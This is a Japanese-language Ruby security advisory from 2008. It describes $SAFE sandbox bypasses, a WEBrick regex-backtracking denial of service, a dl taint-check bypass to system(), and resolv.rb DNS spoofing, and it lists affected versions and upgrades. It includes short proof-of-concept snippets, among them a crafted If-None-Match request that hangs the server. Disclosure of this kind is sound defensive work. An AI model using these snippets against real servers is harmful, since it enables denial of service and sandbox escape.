---
layout: news_post
title: "Rubyに複数の脆弱性"
lang: ja
---

Rubyに複数の脆弱性が発見されました。最新バージョンへのアップグレードを推奨します。

## 

以下のような脆弱性が発見されました。

### 

セーフレベルにいくつかの脆弱性が発見されました。

* untrace\_varがセーフレベル4で実行可能です。
  
      trace_var(:$VAR) {|val| puts "$VAR = #{val}" }
      
      Thread.new do
       $SAFE = 4
       eval %q{
         proc = untrace_var :$VAR
         proc.first.call("aaa")
       }
      end.join

* $PROGRAM\_NAMEがセーフレベル4で変更可能です。
  
      Thread.new do
       $SAFE = 4
       eval %q{$PROGRAM_NAME.replace "Hello, World!"}
      end.join
      
      $PROGRAM_NAME #=> "Hello, World!"

* 安全でないメソッドがセーフレベル1〜3で呼び出される可能性があります。
  
      class Hello
       def world
         Thread.new do
           $SAFE = 4
           msg = "Hello, World!"
           def msg.size
             self.replace self*10 # replace string
             1 # return wrong size
           end
           msg
         end.value
       end
      end
      
      $SAFE = 1 # or 2, or 3
      s = Hello.new.world
      if s.kind_of?(String)
       puts s if s.size < 20 # print string which size is less than 20
      end

* Syslogの操作がセーフレベル4で実行可能です。
  
      require "syslog"
      
      Syslog.open
      
      Thread.new do
       $SAFE = 4
       eval %q{
         Syslog.log(Syslog::LOG_WARNING, "Hello, World!")
         Syslog.mask = Syslog::LOG_UPTO(Syslog::LOG_EMERG)
         Syslog.info("masked")
         Syslog.close
       }
      end.join

これらの脆弱性は山口慶太さんによって報告されました。

### 

WEBrick::HTTP::DefaultFileHandlerには、
WEBrick::HTTPUtils.split\_header\_valueの正規表現のバックトラックのため、
リクエストの処理に指数関数的時間を要する欠陥があります。

攻撃可能なサーバの例:

    require 'webrick'
    WEBrick::HTTPServer.new(:Port => 2000, :DocumentRoot => "/etc").start

攻撃の例:

    require 'net/http'
    res = Net::HTTP.start("localhost", 2000) { |http|
      req = Net::HTTP::Get.new("/passwd")
      req['If-None-Match'] = %q{meh=""} + %q{foo="bar" } * 100
      http.request(req)
    }
    p res

このリクエストの処理は実質的には終了しません。

この脆弱性はChristian Neukirchenさんによって報告されました。

### 

dlはオブジェクトの汚染フラグをチェックしないため、攻撃者に危険な関数の実行を許してしまう可能性があります。

    require 'dl'
    $SAFE = 1
    h = DL.dlopen(nil)
    sys = h.sym('system', 'IP')
    uname = 'uname -rs'.taint
    sys[uname]

この脆弱性はsheepmanさんによって報告されました。

### 

resolv.rbには、リモートの攻撃者が偽造したDNS問い合わせの返答の受け入れを許す脆弱性があります。
この危険性は問い合わせのトランザクションID とソースポートのランダム化により低減できますが、resolv.rb ではどちらも行っていません。
修正により、それらのランダム化を行うようになります。

* 参考: [CVE-2008-1447][1]

この脆弱性は田中哲さんによって報告されました。

## 


: * 1\.8.5以前の全てのバージョン
  * 1\.8.6-p286以前の全てのバージョン
  * 1\.8.7-p71以前の全てのバージョン


: * r18423以前の全てのリビジョン

## 

各バージョンでの対応方法を以下に記載します。


: 1\.8.6-p287または1.8.7-p72に更新してください。
  * [&lt;URL:ftp://ftp.ruby-lang.org/pub/ruby/1.8/ruby-1.8.6-p287.tar.gz&gt;][2]
  * [&lt;URL:ftp://ftp.ruby-lang.org/pub/ruby/1.8/ruby-1.8.7-p72.tar.gz&gt;][3]



: Subversionで最新版をチェックアウトしてください。
  
      $ svn co http://svn.ruby-lang.org/repos/ruby/trunk ruby

Rubyのパッケージを配布している各ベンダから、この脆弱性を修正した版のパッケージが提供されている場合もあります。詳細については各ベンダにお問い合わせください。

## 

これらの脆弱性は山口慶太さん・Christian Neukirchenさん・sheepmanさん・田中哲さんにより Ruby Security
Teamに報告されました。

## 

* 2007-08-08 12:24 +09:00 ruby 1.9のリビジョン番号を修正しました。
* 2007-08-11 11:31 +09:00 ruby 1.8のパッチレベルを修正しました。[Ruby 1.8.7-p72 /
  1.8.6-p287 のリリースアナウンス][4]を参照ください。

Posted by Shugo Maeda on 08 Aug 2008
{: .post-info}



[1]: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1447 
[2]: ftp://ftp.ruby-lang.org/pub/ruby/1.8/ruby-1.8.6-p287.tar.gz 
[3]: ftp://ftp.ruby-lang.org/pub/ruby/1.8/ruby-1.8.7-p72.tar.gz 
[4]: http://www.ruby-lang.org/ja/news/2008/08/11/ruby-1-8-7-p72-and-1-8-6-p287-released/ 
